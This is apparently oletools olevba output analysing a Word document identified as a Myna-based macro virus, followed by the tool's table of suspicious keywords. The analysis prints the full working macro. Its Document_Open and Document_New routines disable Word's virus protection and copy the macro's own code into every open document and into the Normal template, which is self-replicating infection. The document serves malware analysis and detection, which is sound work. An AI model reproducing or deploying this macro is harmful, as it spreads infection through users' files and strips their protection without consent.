olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myna-based-0383d769f8a19a108ddfd23311dbad1b8f581db7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myna-based-0383d769f8a19a108ddfd23311dbad1b8f581db7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()

End Sub

Private Sub Document_New()
'
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "This Document"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("This Document", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("This Document", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub

Private Sub Document_Open()
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 answer = "This Document"
  Options.VirusProtection = False
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("This Document", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("This Document", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub













































Private Sub CheckBox1_Click()

End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
